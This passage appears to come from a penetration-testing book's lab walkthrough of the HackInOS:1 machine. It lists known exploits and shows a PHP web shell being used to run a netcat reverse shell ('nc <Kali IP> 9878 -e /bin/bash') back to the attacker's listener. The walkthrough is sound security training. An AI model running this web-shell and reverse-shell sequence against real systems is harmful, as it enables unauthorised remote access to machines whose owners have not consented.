    \ using pentestmonkeyperl payload.\n\n            ![](images/ent.jpg) phptax 0.8\
    \ - Remote Code Execution     | exploits/php/webapps/21665.txt\n\n# [HackInOS:1](#toc.xhtml_s131a)\n\
    \nContinuing from the research phase of the previous chapter, you may recall that\
    \ after bypassing the image file upload restriction, we were successful in uploading\
    \ a basic shell on the remote machine. We had also identified various exploits\
    \ for the services such as Apache, WordPress and OpenSSH which were found to be\
    \ running on the target system.\n\nThe other potential exploits identified on\
    \ the HackinOS target in the previous phase are given in the following table:\n\
    \n**`Apache 2.4.17 < 2.4.38 - 'apache2ctl g | exploits/linux/local/46676.php`**\n\
    \n**`Apache < 2.2.34 / < 2.4.27 - OPTIONS M | exploits/linux/webapps/42745.py`**\n\
    \n**`WordPress Plugin Quick Page/Post Redir | exploits/php/webapps/32867.txt`**\n\
    \n**`OpenSSH 7.2p2 - Username Enumeration   | exploits/linux/remote/40136.py`**\n\
    \n**`OpenSSHd 7.2p2 - Username Enumeration  | exploits/linux/remote/40113.txt`**\n\
    \nWe will start by using the web shell access and find a way to elevate this to\
    \ a full reverse shell.\n\nLet’s begin by running a netcat listener on our Kali\
    \ system, and configure it to receive incoming connections on port 9878.\n\n![](images/Figure-8.28.jpg)\n\
    \n**Figure 8.28:** Setting up netcat listener\n\nYou may have noticed in the previous\
    \ chapter that the HackinOS target periodically deletes the **`cmd.php`** file\
    \ uploaded to the **`/uploads`** directory. So, you will have to re-upload the\
    \ **`cmd.php`** using the upload page **`http://10.0.2.4:8000/upload.php`** and\
    \ then execute the **`wfuzz -w md5strings.txt --hc 404 http://10.0.2.4:8000/uploads/FUZZ.php`**\
    \ command to find the file to identify the name of the newly uploaded webshell.\n\
    \nNow, first check whether netcat is installed on the HackinOS target using the\
    \ whereis command\n\n**`http://10.0.2.4:8000/uploads/<md5string>.php?cmd=whereis\
    \ nc`**\n\n![](images/Figure-8.29.jpg)\n\n**Figure 8.29:** Using php webshell\
    \ to find netcat\n\nBingo!!, Netcat is installed on the target host and is located\
    \ in the **`/bin directory`**.\n\nWe can use netcat to send a reverse shell connection\
    \ to the listener using the following command:\n\n**`http://10.0.2.4:8000/uploads/<md5string>.php?cmd=nc\
    \ <Kali IP><9878> -e /bin/bash`**\n\n![](images/Figure-8.30.jpg)\n\n**Figure 8.30:**\
    \ Executing netcat reverse shell command using webshell\n\nLet’s get back to the\
    \ terminal and check whether we have a reverse shell connect-back from the HackinOS\
    \ target.\n\n![](images/Figure-8.31.jpg)\n\n**Figure 8.31:** Reverse shell connect\
    \ back on netcat listener\n\nGreat!!, we have a reverse shell connect back from\
    \ the target, running the ‘id’ command shows that we have gained privileges of\
    \ **`www-data user`** and **`www-data`** group."
